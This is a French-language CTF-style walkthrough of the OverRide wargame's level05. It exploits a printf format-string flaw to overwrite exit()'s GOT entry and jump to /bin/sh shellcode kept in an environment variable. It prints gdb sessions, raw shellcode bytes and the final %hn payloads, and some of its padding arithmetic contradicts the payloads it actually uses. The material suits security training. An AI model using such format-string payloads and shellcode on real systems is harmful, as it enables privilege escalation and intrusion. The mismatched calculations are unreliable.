
Dans cet exercice, le code nous demande un input, les lettres majuscules de cet input vont etre converti en minuscules.
ensuite notre inpout sera utilise dans printf.

plus loin dans le code on voit un appel a la fonction `exit()`. C'est ce qui nous met sur la piste d'overwrite la GOT table.
La GOT table est stocke des noms de fonctions et leurs adresses en memoire.

on commence par identifier l'adresse de `exit()` sur la GOT table.

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```
l'adresse de exit dans la GOT table est donc `0x80497e0`

on va maintenant chercher l'adresse de "/bin/sh" en le cherchant parmis les adresses de la libc
```bash
(gdb) info proc mappings
process 1742
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level05/level05
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level05/level05
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find /b 0xf7e4e000, 0xf7ffd000, '/', 'b', 'i', 'n', '/', 's', 'h'
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b73, halting search.
1 pattern found
```
maintenant on connait l'adresse de /bin/sh



maintenant on deroule la stack et on cherche cette valeur.







on doit override l'adresse de la fonction exit() dans la GOT table grace a une mauvaise utilisation de la fonction printf dans le code


dans l'idee ca ressemble beaucoup a un flag de rainfall ou tu utilises une option de printf pour ecrire a une adresse le nombre de caracteres que tu a ecris grace a printf, et en deux parties, 2 octets par 2 octets.

wtf on peut pas creer de fichier dans /tmp...

`find / -type d -writable 2>/dev/null` pour trouver un repertoire ou enregistrer notre exploit


on cherche la valeur de exit() sur la got table
```bash
objdump -R ./level05
```
du coup c'est `080497e0` l'adresse qu'on doit override

maintenant on cherche l'adresse qui remplacera cette adresse
on va mettre notre shellcode dans une variable d'env et on va regarder avec gdb quelle est l'adresse de cette variable d'env.
```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```
```bash
gdb ./level05
(gdb) break main
(gdb) run
(gdb) call (char*)getenv("SHELLCODE")
```

l'adresse est donc `0xffffd87b`


```bash
./level05 <<< $(python -c 'print "AAAA" + "BBBB" + " %x"*15')
```
```
aaaabbbb 64 f7fcfac0 f7ec3add ffffd66f ffffd66e 0 ffffffff ffffd6f4 f7fdb000 61616161 62626262 20782520 25207825 78252078 20782520
```
On voit clairement :
    Position 10 : 61616161 (AAAA en hex)
    Position 11 : 62626262 (BBBB en hex)


Avec l'adresse 0xffffd87b
0xd87b = 55419 décimal
0xffff = 65535 décimal
Padding1 = 55419 - 8 = 55411
Padding2 = 65535 - 55419 = 10116

```bash
python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%55369x%10$hn%10158x%11$hn"' > /var/tmp/exploit
```

```bash
(cat /var/tmp/exploit; cat) | ./level05
f7fcfac0

Segmentation fault (core dumped)
```
ca fonctionne presque, je dois pas etre tres loin





imprevu, l'adresse de ma variable d'env semble avoir change

```bash
level05@OverRide:~$ objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
level05@OverRide:~$ cat > /tmp/getenv.c << 'EOF'
> #include <stdio.h>
> #include <stdlib.h>
> 
> int main() {
>     char *addr = getenv("SHELLCODE");
>     printf("%p\n", addr);
>     return 0;
> }
> EOF
level05@OverRide:~$ 
level05@OverRide:~$ gcc /tmp/getenv.c -o /tmp/getenv -m32
level05@OverRide:~$ /tmp/getenv
0xffffd886
```

Avec l'adresse 0xffffd886
0xd87b = 55419 décimal
0xffff = 65535 décimal
Padding1 = 55419 - 8 = 55411
Padding2 = 65535 - 55419 = 10116

```bash
python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55422x%10$hn%10105x%11$hn"' > /var/tmp/exploit
```

```bash
(cat /var/tmp/exploit; cat) | ./level05
```







